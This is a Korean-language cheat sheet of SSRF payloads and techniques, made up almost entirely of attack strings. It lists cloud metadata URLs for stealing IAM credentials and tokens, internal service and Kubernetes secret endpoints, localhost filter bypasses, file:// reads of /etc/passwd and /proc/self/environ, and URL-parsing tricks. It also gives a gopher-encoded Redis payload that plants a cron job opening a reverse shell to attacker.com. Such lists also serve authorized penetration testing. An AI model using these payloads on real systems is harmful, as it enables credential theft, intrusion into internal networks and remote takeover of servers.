# SSRF (Server-Side Request Forgery) — 페이로드 & 기법

## 클라우드 메타데이터
```
# AWS EC2
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/
http://[fd00:ec2::254]/latest/meta-data/   # IPv6

# AWS IMDSv2 (토큰 필요)
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl -H "X-aws-ec2-metadata-token: <TOKEN>" http://169.254.169.254/latest/meta-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# 헤더 필수: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# 헤더 필수: Metadata: true

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/account-id
```

## 내부망 스캐닝
```
# 일반적인 내부 서비스
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:8080/
http://127.0.0.1:8443/
http://127.0.0.1:22/
http://127.0.0.1:3306/  (MySQL)
http://127.0.0.1:5432/  (PostgreSQL)
http://127.0.0.1:6379/  (Redis)
http://127.0.0.1:27017/ (MongoDB)
http://127.0.0.1:9200/  (Elasticsearch)
http://127.0.0.1:2375/  (Docker API)
http://127.0.0.1:8500/  (Consul)
http://127.0.0.1:2181/  (Zookeeper)

# 쿠버네티스
http://10.0.0.1:443/api/v1/namespaces/default/secrets
http://kubernetes.default.svc/api/v1/namespaces/default/pods
http://kubernetes.default.svc.cluster.local/api/
```

## 필터 우회
```
# localhost 우회
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://0/
http://0x7f000001/         (hex)
http://2130706433/         (decimal)
http://127.1/
http://127.0.1/
http://①②⑦.⓪.⓪.①/      (unicode)

# SSRF via open redirect
http://target.com/redirect?url=http://169.254.169.254/

# DNS rebinding
http://ATTACKER-CONTROLLED.com/  → resolves to 169.254.169.254

# 프로토콜 스위칭
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO%0D%0A
sftp://attacker.com:11111/
tftp://attacker.com:12346/TEST
ldap://localhost:389/%0astats%0aquit

# URL 파싱 불일치 악용
http://attacker.com@169.254.169.254/
http://169.254.169.254#@attacker.com/
http://169.254.169.254 .attacker.com/
```

## Gopher — Redis RCE
```
# Redis SLAVEOF → RCE
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/9999 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A/var/spool/cron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Redis RESP 직접 작성 (tool: Gopherus)
python3 gopherus.py --exploit redis
```

## Blind SSRF — 탐지
```
# Burp Collaborator / interactsh
http://BURP-COLLABORATOR.burpcollaborator.net/
http://interact.sh/

# DNS 기반 탐지
http://<unique>.dnslog.cn/
curl https://interactsh.com/register
```
